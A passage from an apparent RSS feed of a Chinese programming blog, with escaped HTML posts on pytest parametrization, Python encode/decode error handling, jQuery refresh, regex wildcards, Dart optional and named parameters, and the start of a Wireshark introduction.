&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parametrize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_input,expected&amp;#34;&lt;/span&gt;, [(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3+5&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;), (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2+4&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;), (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;6*9&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;)])
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_eval&lt;/span&gt;(test_input, expected):
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;测试数据&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;test_input&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;,期望结果&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;expected&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; eval(test_input) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; expected
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b装饰测试类&#34;&gt;b.装饰测试类&lt;/h3&gt;
&lt;p&gt;当装饰器&lt;code&gt;@pytest.mark.parametrize&lt;/code&gt;装饰测试类时，会将数据集合传递给类的所有测试用例方法。注意，此时所有的测试方法都必须传入这些参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parametrize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a, b, expect&amp;#39;&lt;/span&gt;, data_1)
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TestParametrize&lt;/span&gt;:

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_parametrize_1&lt;/span&gt;(self, a, b, expect):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;测试函数11111 测试数据为&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(a, b))
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; expect

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_parametrize_2&lt;/span&gt;(self, a, b, expect):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;测试函数22222 测试数据为&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(a, b))
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; expect
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c多个参数化&#34;&gt;c.多个参数化&lt;/h3&gt;
&lt;p&gt;一个函数或一个类可以装饰多个 &lt;code&gt;@pytest.mark.parametrize&lt;/code&gt; ，这种方式，最终生成的用例数是&lt;code&gt;n*m&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;data_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]
data_2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;]

&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parametrize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;, data_1)
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parametrize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, data_2)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_parametrize_1&lt;/span&gt;(a, b):
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;笛卡尔积 测试数据为 ： &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;a&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;，&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;b&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3参数化的作用&#34;&gt;3.参数化的作用&lt;/h2&gt;
&lt;p&gt;当用例为测试数据与结果的交互时，便可使用参数化以节省代码量。如登录用例，结果成功或失败，但事件可以是账号空，密码空，账号密码都空，密码错误，账号不存在等，此时使用参数化可极大的减少代码量&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—编解码问题</title>
        <link>https://ac-lm.github.io/posts/python/python%E7%BC%96%E8%A7%A3%E7%A0%81%E9%97%AE%E9%A2%98/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E7%BC%96%E8%A7%A3%E7%A0%81%E9%97%AE%E9%A2%98/</guid>
        <description>&lt;h2 id=&#34;1二进制字符&#34;&gt;1.二进制字符&lt;/h2&gt;
&lt;p&gt;在计算机中所有字符都是以二进制代码储存的，系统根据不同的编码格式，将二进制代码转换为字符显示。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\u0394&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\U00000394&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\N{greek capital letter delta}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2乱码时的处理&#34;&gt;2.乱码时的处理&lt;/h2&gt;
&lt;p&gt;当编码格式与解码格式出现冲突时就会出现乱码，而此时往往需要将报错的部分进行替换处理，使得程序整体不出错。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 不处理&lt;/span&gt;
print((&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;abc&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strict&amp;#34;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;# 替换为U+FFFD&lt;/span&gt;
print((&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;abc&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;replace&amp;#34;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;# 加上反斜杠&lt;/span&gt;
print((&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;abc&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;backslashreplace&amp;#34;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;# 直接忽略&lt;/span&gt;
print((&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;abc&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ignore&amp;#34;&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3字符与二进制的转换&#34;&gt;3.字符与二进制的转换&lt;/h2&gt;
&lt;h3 id=&#34;a二进制转换字符&#34;&gt;a.二进制转换字符&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;u&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;chr(&lt;span style=&#34;color:#ae81ff&#34;&gt;40960&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abce&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;chr(&lt;span style=&#34;color:#ae81ff&#34;&gt;1972&lt;/span&gt;)
print(u)
u1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;chr(&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;)
print(u1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b字符转换二进制&#34;&gt;b.字符转换二进制&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;u&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;中国abc&amp;#34;&lt;/span&gt;
print(u&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;\xe4\xb8\xad\xe5\x9b\xbd&amp;#39;&lt;/span&gt;
print(u&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;))
print(u&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ignore&amp;#34;&lt;/span&gt;))
print(u&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;replace&amp;#34;&lt;/span&gt;))
print(u&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xmlcharrefreplace&amp;#34;&lt;/span&gt;))
print(u&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;backslashreplace&amp;#34;&lt;/span&gt;))
print(u&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;namereplace&amp;#34;&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web开发—jQuery 实现界面刷新</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91jquery-%E5%AE%9E%E7%8E%B0%E7%95%8C%E9%9D%A2%E5%88%B7%E6%96%B0/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91jquery-%E5%AE%9E%E7%8E%B0%E7%95%8C%E9%9D%A2%E5%88%B7%E6%96%B0/</guid>
        <description>&lt;h2 id=&#34;1使用-load-实现的局部刷新&#34;&gt;1.使用 Load 实现的局部刷新&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;jQuery&lt;/code&gt;中&lt;code&gt;load&lt;/code&gt;方法可以加载本地&lt;code&gt;Html&lt;/code&gt;文件里的某个元素，使用这个特性可以实现&lt;code&gt;Html&lt;/code&gt;的局部更新&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#content&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;load&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;list .table&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用-location-实现全局刷新&#34;&gt;2.使用 location 实现全局刷新&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;reload&lt;/span&gt;()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—正则</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E6%AD%A3%E5%88%99/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E6%AD%A3%E5%88%99/</guid>
        <description>&lt;h2 id=&#34;1完全匹配&#34;&gt;1.完全匹配&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;[\s\S]*&lt;/code&gt;：完全通配，\s 是指空白，包括空格，换行，Tab等所有的空白，而 \S 刚好相反，表示字符，这样一正一反下来，就表示所有。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[]&lt;/code&gt;：表示在它里面包含的单个字符不限顺序的出现。&lt;/p&gt;
&lt;h2 id=&#34;2除换行n外匹配&#34;&gt;2.除换行&lt;code&gt;\n&lt;/code&gt;外匹配&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;(.*)&lt;/code&gt;：通配符&lt;code&gt;.&lt;/code&gt;是不会匹配换行的，当出现换行时匹配便会终止。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Dart—可变参数与命名参数</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E4%B8%8E%E5%91%BD%E5%90%8D%E5%8F%82%E6%95%B0/</link>
        <pubDate>Thu, 22 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E4%B8%8E%E5%91%BD%E5%90%8D%E5%8F%82%E6%95%B0/</guid>
        <description>&lt;h2 id=&#34;1可变参数&#34;&gt;1.可变参数&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;dart&lt;/code&gt; 的可变参数使用 &lt;code&gt;[]&lt;/code&gt; 包含，在使用函数时可按顺序直接输入值。（PS：在新版本的Dart语言规范中，可变参数需要被赋予初值，不允许为空）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; test(&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; name,[&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; age]){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(age&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;){
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;;age:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;age&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    }
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; main(){
    test(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;);
    test(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2命名参数&#34;&gt;2.命名参数&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;dart&lt;/code&gt; 的命名参数使用 &lt;code&gt;{}&lt;/code&gt; 包含，在使用函数时需指定值的名字。（PS：在新版本的Dart语言规范中，命名参数需要被赋予初值，不允许为空）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; test(&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; name,{&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; age}){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(age&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;){
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;;age:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;age&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    }
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; main(){
    test(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;);
    test(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;,age: &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Net—Wireshark 网络抓包工具</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netwireshark-%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Mon, 21 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netwireshark-%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/82498482&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Wireshark抓包使用指南@Ju5tice &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0x00wireshark&#34;&gt;0x00.Wireshark&lt;/h2&gt;
&lt;p&gt;WireShark（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是抓取网络封包，并尽可能显示出最为详细的网络封包资料。WireShark 抓包是根据 TCP/IP 五层协议来的，也就是物理层、数据链路层、网络层、传输层、应用层。&lt;/p&gt;
&lt;h2 id=&#34;0x01wireshark可以做什么&#34;&gt;0x01.Wireshark可以做什么&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;网络管理员使用Wireshark检测网络问题&lt;/li&gt;
&lt;li&gt;网安工程师用Wireshark检查信息安全相关问题&lt;/li&gt;
&lt;li&gt;开发者使用Wireshark为新的通信协议调试&lt;/li&gt;
&lt;li&gt;普通用户使用Wireshark学习网络协议相关知识&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x02wireshark不可以做什么&#34;&gt;0x02.Wireshark不可以做什么&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Wireshark不是入侵侦测软件（Intrusion Detection Software, IDS）。对于网络上的异常流量行为，Wireshark不会产生警示或是任何提示。然而，仔细分析Wireshark截取的数据包能够帮助用户对于网络行为有更清楚的了解。&lt;/li&gt;
&lt;li&gt;Wireshark不会对网络数据包产生内容的修改 - 它只会反映出当前流通的数据包信息。 Wireshark本身也不会提交数据包至网络上。就是说你只能查看数据包，不能修改或转发。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;0x03抓包实例&#34;&gt;0x03.抓包实例&lt;/h2&gt;
&lt;p&gt;打开wireshark，主界面如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291751013.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291751013.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;双击上图的中的过滤器（捕获），开始抓包&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
